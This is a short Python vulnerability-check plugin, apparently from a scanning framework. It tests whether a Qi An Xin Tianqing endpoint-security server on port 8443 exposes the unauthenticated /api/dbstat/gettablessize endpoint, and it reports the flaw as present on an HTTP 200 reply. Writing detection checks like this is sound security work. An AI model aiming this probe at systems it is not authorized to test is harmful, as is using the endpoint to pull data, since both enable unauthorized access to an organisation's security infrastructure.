# coding:utf-8
import socket
import requests
import warnings

warnings.filterwarnings('ignore')
vul_info = {
    "id":"10014",
    "name":"天擎越权漏洞",
    "detail":"终端安全管理系统(天擎)奇安信终端安全管理系统是面向政企单位推出的一体化终端安全产品解决方案。",
    "level":"高危",
    "type":"越权访问",
    "port":"8443",
    "solution":"",
    "reference":"http://bbs.qcloud.com/thread-30706-1-1.html",
    "author":"system",
    "expand":"default"
}
def vul_result(code,message):
    return '{"code":"%d","info":"%s"}' % (code,message)
def alive_detect(ip, port, timeout):
    ak = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ak.settimeout(timeout)
    try:
        ak.connect((ip,port))
        ak.close()
        return 'UP'
    except Exception as e:
        return 'DOWN'

def vul_detect(ip, port, timeout=5):
    if alive_detect(ip, int(port), timeout) == 'DOWN':
        return vul_result(2,'目标端口不可达')
    try:
        target = 'https://{}:{}/api/dbstat/gettablessize'.format(ip,port)
        r1 = requests.get(target,verify=False,timeout=timeout)
        if r1.status_code == 200:
            return vul_result(1,'存在')
        else:
            return vul_result(0,'不存在')
    except Exception as e:
        return vul_result(2,e)


